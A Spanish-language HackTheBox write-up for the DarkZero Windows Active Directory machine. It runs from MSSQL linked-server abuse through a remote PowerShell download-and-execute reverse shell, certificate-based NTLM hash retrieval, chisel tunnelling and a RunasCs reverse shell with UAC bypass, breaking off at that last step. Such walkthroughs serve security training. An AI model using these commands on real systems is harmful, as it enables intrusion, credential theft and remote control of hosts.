---
title: DarkZero - Hard (HTB)
permalink: /DarkZero-HTB-Writeup/
tags:
  - Windows
  - Hard
  - BloodHound
  - MSSQL
  - xp_cmdshell
  - PassTheCert
  - "Port Forwarding"
  - RunasCs
  - SeImpersonatePrivilege
  - EfsPotato
  - Kerberos
  - "DC Sync"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: DarkZero - Hard (HTB)
seo_description: Abusa de SQL Server y de la delegación Kerberos para vencer DarkZero.
excerpt: Abusa de SQL Server y de la delegación Kerberos para vencer DarkZero.
header:
  overlay_image: /assets/images/headers/darkzero-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/darkzero-hackthebox.jpg
---
![image-center](/assets/images/posts/darkzero-hackthebox.png)
{: .align-center}

**Habilidades:** Domain Analysis - `Bloodhound`, MSSQL Enumeration, Abusing MSSQL Linked Servers, Abusing `xp_cmdshell` to RCE, PassTheCertificate - Retrieve an NTLM Hash (`UnPAC-the-Hash`), Port Forwarding, Abusing Alternative Logon Types (`RunasCs`), Abusing `SeImpersonatePrivilege` (`EfsPotato`), Abusing Kerberos Unconstrained Delegation - Coerced Authentication, DC Sync [Privilege Escalation]
{: .notice--primary}

# Introducción

DarkZero es una máquina Windows de dificultad `Hard` en HackTheBox donde debemos comprometer un entorno de Active Directory explotando el servicio SQL Server, concretamente el procedimiento almacenado `xp_cmdshell` para obtener acceso inicial en un Controlador de Dominio secundario.

El abuso del privilegio local `SeImpersonatePrivilege` de Windows y la extracción de tickets `kerberos` nos permitirán ganar acceso privilegiado al Controlador de Dominio principal, por ende obtener control total del dominio.

El creador de esta máquina nos deja el siguiente mensaje en la descripción:

> As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w` / `RFulUtONCOL!`
{: .notice--info}
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.89

PING 10.10.11.89 (10.10.11.89): 56 data bytes
64 bytes from 10.10.11.89: icmp_seq=0 ttl=127 time=449.791 ms

--- 10.10.11.89 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 449.791/449.791/449.791/0.000 ms
~~~


## Port Scanning 

Lanzaremos un escaneo de puertos que intente identificar servicios expuestos en la máquina víctima

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.89 -oG openPorts

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-25 11:52 -0300
Nmap scan report for 10.10.11.89
Host is up (0.38s latency).
Not shown: 65512 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49666/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49907/tcp open  unknown
49940/tcp open  unknown
49980/tcp open  unknown
49997/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 55.43 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo que se encargue de intentar identificar la versión de los servicios que descubrimos

~~~ bash
nmap -p 53,88,135,139,389,445,464,593,636,1433,2179,3268,3269,5985,9389,49664,49666,49688,49689,49907,49940,49980,49997 -sVC 10.10.11.89 -oN services

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-25 11:55 -0300
Nmap scan report for 10.10.11.89
Host is up (0.39s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-25 21:55:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-25T17:03:26
|_Not valid after:  2055-12-25T17:03:26
| ms-sql-ntlm-info: 
|   10.10.11.89:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.10.11.89:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-12-25T21:57:22+00:00; +7h00m00s from scanner time.
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49907/tcp open  msrpc         Microsoft Windows RPC
49940/tcp open  msrpc         Microsoft Windows RPC
49980/tcp open  msrpc         Microsoft Windows RPC
49997/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2025-12-25T21:56:40
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.47 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Hemos recolectado información de muchos servicios propios de Active Directory (`DNS`,`kerberos`, `LDAP`, `MSSQL`, etc.), por lo que podemos deducir que estamos frente a un Controlador de Dominio.

En la captura vemos tanto el nombre del dominio como del host, agregaremos esta información a nuestro archivo `/etc/hosts` para resolver correctamente el dominio a través de nuestro DNS

~~~ bash
echo '10.10.11.89 darkzero.htb DC01.darkzero.htb' | sudo tee -a /etc/hosts 
10.10.11.89 darkzero.htb DC01.darkzero.htb
~~~


## Domain Analysis - `Bloodhound`

Aprovecharemos las credenciales proporcionadas para recolectar información del dominio y así después analizarla con `Bloodhound`

~~~ bash
ntpdate DC01.darkzero.htb && bloodhound-python -d darkzero.htb -ns 10.10.11.89 --zip -c All -u john.w -p 'RFulUtONCOL!'
 
2025-10-05 00:15:10.683674 (-0400) +0.008070 +/- 0.103643 DC01.darkzero.htb 10.10.11.89 s1 no-leap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.darkzero.htb
INFO: Done in 00M 58S
INFO: Compressing output into 20251005001514_bloodhound.zip
~~~

No veremos nada relevante en el dominio, ninguna relación que nos permita movernos lateralmente por él


## MSSQL Enumeration

Recordemos que la captura de `nmap` muestra el servicio `MSSQL` (Microsoft SQL Server) abierto, podemos intentar autenticarnos en este servicio e intentar enumerar información dentro de él

~~~ bash
mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@DC01.darkzero.htb -windows-auth

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> 
~~~

- `-windows-auth`: Usar la autenticación de Windows

### Linked Servers

> Los servidores vinculados de SQL Server son una característica que permite al motor de base de datos SQL Server conectarse a fuentes de datos externas y realizar consultas en ellas.
{: .notice--info}

Al enumerar los servidores vinculados con el comando `enum_links`, veremos el servidor `DC02.darkzero.ext`

~~~ bash
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc 
~~~

Usaremos este servidor vinculado para cambiar el contexto de conexión, ahora tendremos el rol `dbo` dentro de la base de datos `master`.

> El rol `dbo` (`Database Owner`) en SQL Server es un usuario especial dentro de cada base de datos que posee todos los permisos, siendo el principal en esa base de datos y el propietario del esquema `dbo`.
{: .notice--info}

~~~ bash
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
~~~
<br>


# Intrusión / Explotación
---
## Abusing `xp_cmdshell` to RCE

> `xp_cmdshell` es un procedimiento almacenado extendido en SQL Server que permite ejecutar comandos del sistema operativo Windows desde dentro de una consulta SQL.
{: .notice--info}

Por motivos de seguridad, esta funcionalidad se encuentra deshabilitada por defecto, podemos habilitarla desde la herramienta con el comando `enable_xp_cmdshell`

``` bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;

INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> RECONFIGURE;

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;

INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> RECONFIGURE;
```

> También podríamos haber usado el comando `enable_xp_cmdshell` para habilitar este procedimiento almacenado.
{: .notice--warning}

Ahora somos capaces de ejecutar comandos con los privilegios de la cuenta de servicio de `SQL Server`

``` bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
output                 
--------------------   
darkzero-ext\svc_sql
```

Iniciaremos un listener con `rlwrap` y `netcat` para esperar una conexión por un puerto, en mi caso elegí el `443`

~~~ bash
rlwrap -cAr nc -lvnp 443
~~~

En mi caso utilicé una reverse shell desde el repositorio de [`nishang`](https://github.com/samratashok/nishang). Ejecutaremos una solicitud HTTP hacia un recurso alojado por nosotros, el cual enviará una reverse shell a nuestro equipo

~~~ bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell curl http://10.10.16.203/Invoke-PowerShellTcpOneLine.ps1 | powershell
~~~


## Shell as `svc_sql` - `DC02`

En nuestro listener recibiremos una consola como la cuenta de servicio `svc_sql`

~~~ bash                                    
Connection from 10.10.11.89:64138

PS C:\Windows\system32> whoami
darkzero-ext\svc_sql
~~~


## System Enumeration

En este punto tenemos acceso a un DC en un dominio secundario (`darkzero.ext`), debemos buscar la forma para saltar al dominio principal desde la cuenta `svc_sql`

### Local Security Policy Backup

Al listar el directorio `C:\`, veremos un archivo llamado `Policy_Backup.inf`

``` powershell
PS C:\Windows\system32> dir C:\

    Directory: C:\
    
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:15 AM                PerfLogs
d-r---         7/29/2025   7:49 AM                Program Files
d-----         7/29/2025   7:48 AM                Program Files (x86)
d-r---         7/29/2025   8:23 AM                Users
d-----         7/30/2025   3:57 PM                Windows
-a----         7/30/2025   6:38 AM          18594 Policy_Backup.inf
```

Al ver su contenido y por el nombre, vemos que se trata de una copia de seguridad de las políticas de seguridad local

``` powershell
PS C:\Windows\system32> Get-Content Policy_Backup.inf -Tail 10

SeRemoteInteractiveLogonRight = *S-1-5-32-544
SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6 # Here
SeCreateGlobalPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
SeIncreaseWorkingSetPrivilege = *S-1-5-32-545
SeTimeZonePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
SeCreateSymbolicLinkPrivilege = *S-1-5-32-544
SeDelegateSessionUserImpersonatePrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"
Revision=1
```

El privilegio `SeImpersonatePrivilege` está asignado a los siguientes grupos:

- `*S-1-5-19` (`NT AUTHORITY\LOCAL SERVICE`)
- `*S-1-5-20` (`NT AUTHORITY\NETWORK SERVICE`)
- `*S-1-5-32-544` (`BUILTIN\Administrators`)
- `*S-1-5-6` (`NT AUTHORITY\SERVICE`)

### Group Memberships

La cuenta `svc_sql` es miembro de `NT AUTHORITY\SERVICE`, podemos comprobarlo con el comando `whoami`

``` powershell
PS C:\Windows\system32> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes                                        
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
```

### Local Privileges

Sin embargo, cuando listamos los privilegios locales, `SeImpersonatePrivilege` no está contemplado

``` powershell
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### UAC

Cuando enumeramos el sistema con herramientas como `winPEAS`, veremos que `UAC` se encuentra activo

> `UAC` (Control de Cuentas de Usuario) en Windows es una característica de seguridad que previene cambios no autorizados en el sistema operativo.
{: .notice--info}

``` powershell
PS C:\Programdata> .\winPEAS.exe

...
<SNIP>
...
???????????? UAC Status
? If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
D-500 local admin account can be used for lateral movement.
...
<SNIP>
...
```

Podemos verificar la configuración de los valores de registro para comprender con mayor profundidad la configuración

``` powershell
PS C:\Programdata> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
    ConsentPromptBehaviorUser    REG_DWORD    0x3
    DelayedDesktopSwitchTimeout    REG_DWORD    0x0
    DisableAutomaticRestartSignOn    REG_DWORD    0x1
    DSCAutomationHostEnabled    REG_DWORD    0x2
    EnableInstallerDetection    REG_DWORD    0x1
    EnableLUA    REG_DWORD    0x1
    EnableSecureUIAPaths    REG_DWORD    0x1
    EnableUIADesktopToggle    REG_DWORD    0x0
    EnableVirtualization    REG_DWORD    0x1
    PromptOnSecureDesktop    REG_DWORD    0x1
    ValidateAdminCodeSignatures    REG_DWORD    0x0
    disablecad    REG_DWORD    0x0
    dontdisplaylastusername    REG_DWORD    0x0
    legalnoticecaption    REG_SZ    
    legalnoticetext    REG_SZ    
    scforceoption    REG_DWORD    0x0
    shutdownwithoutlogon    REG_DWORD    0x0
    undockwithoutlogon    REG_DWORD    0x1
```

- Cuando el valor de `EnableLUA` es `0x1`, significa que el sistema notifica al usuario cuando se intentan hacer cambios en el sistema.

- El valor de `ConsentPromptBehaviorAdmin` en `0x5`: Cuando un administrador intenta elevar privilegios, se muestra un prompt de consentimiento (comportamiento por defecto).

- El valor de `ConsentPromptBehaviorUser` en `0x3`: Los usuarios estándar reciben un prompt que pide credenciales administrativas para elevar.

### Logon Types

Debemos considerar los [`Logon Types`](https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types), donde herramientas como `RunasCs` nos pueden ayudar a conseguir un nuevo tipo de sesión a través de un nuevo token. Algunos de los tipos de inicio de sesión son los siguientes: 

| LogonType | Significado                           |
| --------- | ------------------------------------- |
| 2         | `Interactive` (usuario local / `RDP`) |
| 3         | `Network` (`SMB`, `WinRM`, etc.)      |
| 4         | `Batch` (`Scheduled task`)            |
| 5         | `Service` (servicio)                  |

### Attack Vector

Podríamos intentar ejecutar `RunasCs.exe` para lanzar una shell con otro tipo de sesión para la cuenta `svc_sql`, lo que le otorgará un contexto diferente al lanzar un nuevo proceso.

Sin embargo, tenemos un gran obstáculo, no tenemos las credenciales de la cuenta `svc_sql`, por lo que debemos buscar alguna manera de obtener sus credenciales


## PassTheCertificate

`PassTheCertificate` es una técnica muy efectiva para eludir la autenticación tradicional basada en contraseñas. 

En lugar de usar una contraseña, se utiliza certificados `X.509` y claves privadas para explotar la extensión PKINIT (`Public Key Cryptography for Initial Authentication`) de `kerberos` y así obtener un TGT (`Ticket Granting Ticket`).

> Este ataque puede conducir a otros como [`UnPAC-the-Hash`](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash), con el fin de obtener el hash NTLM de un usuario objetivo.
{: .notice--info}

En el contexto actual, dado que no tenemos credenciales válidas en el dominio `darkzero.ext`, es posible utilizar la técnica `UnPAC-the-Hash` con el fin de autenticarnos vía PKINIT abusando de `S4U2self` + `U2U` y obtener el hash NTLM de la cuenta `svc_sql`.

Podemos usar una plantilla que admita autenticación de cliente (`Client Authenticaton EKU`). Enumeraremos las plantillas disponibles usando `Certify`

> Iniciaremos un servidor HTTP para facilitar la transferencia de las herramientas que usaremos: `python3 -m http.server 80`
{: .notice--warning}

``` powershell
PS C:\Programdata> curl http://10.10.16.203/Certify.exe -o Certify.exe
PS C:\Programdata> .\Certify.exe find /ca:DARKZERO.EXT\darkzero-ext-DC02-CA

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=darkzero,DC=ext'
[*] Restricting to CA name : DARKZERO.EXT\darkzero-ext-DC02-CA
...
<SNIP>
...
[*] Available Certificates Templates :

    CA Name                               : DC02.darkzero.ext\darkzero-ext-DC02-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : darkzero-ext\Domain Admins    S-1-5-21-1969715525-31638512-2552845157-512
                                      darkzero-ext\Domain Users     S-1-5-21-1969715525-31638512-2552845157-513
                                      darkzero-ext\Enterprise AdminsS-1-5-21-1969715525-31638512-2552845157-519
      Object Control Permissions
        Owner                       : darkzero-ext\Enterprise AdminsS-1-5-21-1969715525-31638512-2552845157-519
        WriteOwner Principals       : darkzero-ext\Domain Admins    S-1-5-21-1969715525-31638512-2552845157-512
                                      darkzero-ext\Enterprise AdminsS-1-5-21-1969715525-31638512-2552845157-519
        WriteDacl Principals        : darkzero-ext\Domain Admins    S-1-5-21-1969715525-31638512-2552845157-512
                                      darkzero-ext\Enterprise AdminsS-1-5-21-1969715525-31638512-2552845157-519
        WriteProperty Principals    : darkzero-ext\Domain Admins    S-1-5-21-1969715525-31638512-2552845157-512
                                      darkzero-ext\Enterprise AdminsS-1-5-21-1969715525-31638512-2552845157-519
```

La plantilla `User` está habilitada. Solicitaremos un certificado para la cuenta `svc_sql` de la siguiente manera

``` powershell
PS C:\Programdata> .\Certify.exe request /ca:DARKZERO.EXT\darkzero-ext-DC02-CA /template:User /subject:CN=SVC_SQL,CN=USERS,DC=DARKZERO,DC=EXT

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[*] Current user context    : darkzero-ext\svc_sql

[*] Template                : User
[*] Subject                 : CN=SVC_SQL,CN=USERS,DC=DARKZERO,DC=EXT

[*] Certificate Authority   : DARKZERO.EXT\darkzero-ext-DC02-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 8

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAq/mFQCNmSS6ddUADtj6L/t5zWN3NVOp9Gv263EDLbxhpKMeV
Vc9kwR7CxItxFcDr2iULTVyR0mxt1TZHVFn/OMmZhZOT5xMlUvR7APeFthz/4MnF
...
<SNIP>
...
```

### Port Forwarding

Hasta ahora no tenemos alcance hasta `DC02` sin tener que pasar por la instancia dentro de `MSSQL`. Es por esto que se vuelve necesario usar un proxy para alcanzar este host mediante un reenvío de puertos.

Iniciaremos un servidor con [`chisel`](https://github.com/jpillora/chisel) por un puerto empleando la siguiente sintaxis, en mi caso elegí el puerto `8000`

``` bash
./chisel server -p 8000 --reverse
```

Iniciaremos `chisel` para Windows en modo cliente para conectarnos a nuestro servidor de la siguiente manera

``` powershell
PS C:\Programdata> curl http://10.10.16.203/chisel.exe -o chisel.exe
PS C:\Programdata> .\chisel.exe client 10.10.16.123:8000 R:socks
```

### Clock synchronization

Como la sincronización de relojes es necesaria en un entorno que usa `kerberos`, podemos usar el comando `ntpdate` para ajustar la hora, de forma que coincida con `DC01`

``` bash
sudo ntpdate -u DC01.darkzero.htb                                        
26 Dec 00:47:39 ntpdate[7244]: step time server 10.10.11.89 offset +25200.872824 sec
```

### Authentication

Ahora nos queda autenticarnos en `DC02` utilizando el certificado PFX que exportamos, obtendremos credenciales en caché (`.ccache`) además del hash NTLM de la cuenta `svc_sql`

~~~ bash
proxychains -q certipy auth -pfx cert.pfx -dc-ip 172.16.20.2 -username svc_sql -domain darkzero.ext

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'svc_sql@darkzero.ext'
[*]     Security Extension SID: 'S-1-5-21-1969715525-31638512-2552845157-1103'
[*] Using principal: 'svc_sql@darkzero.ext'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_sql.ccache'
[*] Wrote credential cache to 'svc_sql.ccache'
[*] Trying to retrieve NT hash for 'svc_sql'
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
~~~

### Password Change

Con el hash NTLM cambiaremos la contraseña de la cuenta `svc_sql`

~~~ bash
proxychains -q changepasswd.py darkzero.ext/svc_sql@DC02.darkzero.ext -hashes :816ccb849956b531db139346751db65f -newpass 'Password123!' -dc-ip 172.17.20.2

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of darkzero.ext\svc_sql
[*] Connecting to DCE/RPC as darkzero.ext\svc_sql
[*] Password was changed successfully.
~~~


## Abusing Alternative Logon Types

La herramienta `RunasCs.exe` permite ejecutar un nuevo proceso utilizando credenciales explícitas, solicitando un inicio de sesión alternativo y obteniendo un [token de acceso](https://learn.microsoft.com/es-es/windows/win32/secauthz/access-tokens#access-token-contents).

En este caso intentaremos solicitar un tipo de sesión de servicio (`5`), el cual debido a la copia de las políticas que vimos antes, el nuevo contexto del token podría contemplar el privilegio `SeImpersonatePrivilege`. 

Además, podemos intentar hacer `bypass` al UAC con la flag `-b` o `--bypass-uac` para evitar un error que nos impide ejecutar el comando

~~~ bash
PS C:\Programdata> .\RunasCs.exe svc_sql 'Password123!' 'cmd.exe /c whoami' -l 5 -b

darkzero-ext\svc_sql
~~~

El `bypass` logra hacerse correctamente y se ejecuta el comando `whoami`. Ahora enviaremos una reverse shell para operar de una forma más cómoda desde una nueva consola. 

Iniciaremos un listener para recibir la conexión por un puerto, en mi caso volveré a usar el `443`

``` bash
rlwrap -cAr nc -lvnp 443
```

Enviaremos una consola de `powershell` a nuestra IP de la siguiente manera

~~~ bash
PS C:\Programdata> .\RunasCs.exe svc_sql 'Password123!' powershell.exe -r 10.10.16.203:4444 -l 5 -b

[+] Running in session 0 with process function CreateProcessWithLogonW()
